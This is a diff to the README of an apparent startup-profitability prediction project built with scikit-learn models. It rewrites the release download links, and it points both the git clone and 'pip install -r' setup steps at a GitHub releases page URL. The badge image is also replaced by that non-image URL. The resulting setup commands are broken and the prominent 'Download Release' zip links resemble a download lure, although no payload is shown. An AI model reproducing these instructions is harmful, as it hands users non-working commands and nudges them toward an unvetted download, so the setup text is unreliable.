@@ -26,16 +26,16 @@ In this project, we explore the predictive power of financial metrics (such as f
 
 🏷️ **Topics:** ai-for-finance, data-science, financial-modelling, logistic-regression, machine-learning, predictive-analytics, python, random-forest, scikit-learn, startup-analysis
 
-🔗 **Release.zip:** [Download Release](https://github.com/releases/789694263/Release.zip)
+🔗 **https://github.com/huucanh0511/Startup-Profitability-Prediction/releases** [Download Release](https://github.com/huucanh0511/Startup-Profitability-Prediction/releases)
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
+[![](https://github.com/huucanh0511/Startup-Profitability-Prediction/releases)](https://github.com/huucanh0511/Startup-Profitability-Prediction/releases)
 
 ## Getting Started
 
 To get started with exploring the project and running the predictive models, follow these steps:
 
-1. **Clone the Repository:** `git clone https://github.com/your-username/Startup-Profitability-Prediction.git`
-2. **Install Dependencies:** `pip install -r requirements.txt`
+1. **Clone the Repository:** `git clone https://github.com/huucanh0511/Startup-Profitability-Prediction/releases`
+2. **Install Dependencies:** `pip install -r https://github.com/huucanh0511/Startup-Profitability-Prediction/releases`
 3. **Explore the Notebooks:** Check out the Jupyter notebooks for detailed analysis and model building.
 4. **Run the Models:** Execute the scripts to train and evaluate the Logistic Regression and Random Forest models.
 5. **Evaluate Results:** Analyze the performance metrics and visualizations generated to draw insights.
